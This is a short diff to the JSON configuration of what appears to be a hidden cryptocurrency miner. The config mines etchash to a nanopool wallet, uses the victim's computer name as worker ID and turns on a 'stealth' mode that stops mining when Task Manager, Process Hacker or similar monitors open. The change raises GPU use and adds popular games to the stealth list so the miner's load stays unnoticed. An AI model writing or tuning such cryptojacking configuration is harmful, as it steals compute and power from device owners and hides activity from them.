@@ -1,9 +1,9 @@
 {
     "url": "stratum://`0xBF2F8b72d11F3D037D90ba75A1011587C5a4F6c8.{COMPUTERNAME}`@etc-eu1.nanopool.org:19999",
     "algo": "etchash",
-    "max-gpu": 40,
+    "max-gpu": 60,
     "idle-wait": 2,
     "idle-gpu": 100,
     "stealth": true,
-    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,Warframe.x64.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,"
 }
